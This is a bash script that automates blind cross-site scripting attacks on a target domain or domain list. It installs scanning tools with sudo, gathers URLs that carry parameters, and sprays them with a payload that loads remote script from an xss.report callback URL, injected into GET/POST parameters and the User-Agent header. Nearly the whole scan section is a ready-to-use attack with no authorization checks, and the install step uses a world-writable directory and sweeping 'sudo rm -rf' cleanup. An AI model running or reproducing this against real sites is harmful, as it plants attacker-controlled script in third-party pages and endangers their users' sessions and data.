#!/usr/bin/env bash
BOLD_BLUE="\033[1;34m"
RED="\033[0;31m"
NC="\033[0m"
BOLD_YELLOW="\033[1;33m"

# Function to display usage message
display_usage() {
    echo "Usage:"
    echo "     $0 -d http://example.com"
    echo ""
    echo "Options:"
    echo "  -h               Display this help message"
    echo "  -d               Single site scan"
    echo "  -l               Multiple site scan"
    echo "  -c               Installing required tools"
    echo "  -i               Check if required tools are installed"
    exit 0
}

# Check if help is requested
if [[ "$1" == "-h" ]]; then
    display_usage
    exit 0
fi

# Function to check installed tools
check_tools() {
    tools=( "bxss" "urlfinder" "google-chrome" "anew" "unfurl")

    echo "Checking required tools:"
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "${BOLD_BLUE}$tool is installed at ${BOLD_WHITE}$(which $tool)${NC}"
        else
            echo -e "${RED}$tool is NOT installed or not in the PATH${NC}"
        fi
    done
}

# Check if tool installation check is requested
if [[ "$1" == "-i" ]]; then
    check_tools
    exit 0
fi

# Check if help is requested
if [[ "$1" == "-c" ]]; then
    mkdir -p --mode=777 bx

    cd bx
    sudo apt install unzip -y
    echo "bxss=================================="
    wget "https://github.com/ethicalhackingplayground/bxss/releases/download/v0.0.3/bxss_Linux_x86_64.tar.gz"
    sudo tar -xvzf bxss_Linux_x86_64.tar.gz
    sudo mv bxss /usr/local/bin/
    sudo chmod +x /usr/local/bin/bxss
    bxss -h
    sudo rm -rf ./*
    cd

    cd bx
    echo "urlfinder===================================="
    wget "https://github.com/projectdiscovery/urlfinder/releases/download/v0.0.3/urlfinder_0.0.3_linux_amd64.zip"
    sudo unzip urlfinder_0.0.3_linux_amd64.zip
    sudo mv urlfinder /usr/local/bin/
    sudo chmod +x /usr/local/bin/urlfinder
    urlfinder -h
    sudo rm -rf ./*
    cd

    cd bx
    echo "google-chrome===================================="
    wget "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
    sudo apt --fix-broken install -y
    sudo apt update --fix-missing
    sudo apt install ./google-chrome-stable*.deb -y
    sudo apt update --fix-missing
    sudo apt install ./google-chrome-stable*.deb -y
    sudo rm -rf ./*
    cd

    cd bx
    echo "unfurl=================================="
    wget "https://github.com/tomnomnom/unfurl/releases/download/v0.4.3/unfurl-linux-amd64-0.4.3.tgz"
    sudo tar -xzvf unfurl-linux-amd64-0.4.3.tgz
    sudo mv unfurl /usr/local/bin/
    sudo chmod +x /usr/local/bin/unfurl
    unfurl -h
    sudo rm -rf ./*
    cd

    cd bx
    echo "anew===================================="
    wget "https://github.com/tomnomnom/anew/releases/download/v0.1.1/anew-linux-amd64-0.1.1.tgz"
    sudo tar -xzvf anew-linux-amd64-0.1.1.tgz
    sudo mv anew /usr/local/bin/
    sudo chmod +x /usr/local/bin/anew
    sudo rm -rf ./*
    anew -h
    cd

    sudo rm -rf bx
    
    exit 0
fi


# bxss vulnerability
if [[ "$1" == "-d" && "$3" == "-u" ]]; then
    echo "Single Domain==============="
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)

    urlfinder -d "$domain_Without_Protocol" -fs fqdn -all | grep -aiE "[=&]" | grep -aiEv "css|ico|woff|woff2|svg|ttf|eot|png|jpg|gif|js|json|pdf|jpg|jpeg|txt|webp" | anew | tee $domain_Without_Protocol.txt;cat $domain_Without_Protocol.txt | bxss -t -X GET,POST  -p "'\"><script src=https://xss.report/c/$4></script>" -H "User-Agent"
    exit 0
fi

# Multi domain
# bxss vulnerability
if [[ "$1" == "-l" && "$3" == "-u" ]]; then
    echo "Multi Domain==============="
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)

    urlfinder -d "$domain_Without_Protocol" -all | grep -aiE "[=&]" | grep -aiEv "css|ico|woff|woff2|svg|ttf|eot|png|jpg|gif|js|json|pdf|jpg|jpeg|txt|webp" | anew | tee $domain_Without_Protocol.txt;cat $domain_Without_Protocol.txt | bxss -t -X GET,POST  -p "'\"><script src=https://xss.report/c/$4></script>" -H "User-Agent"
    exit 0
fi
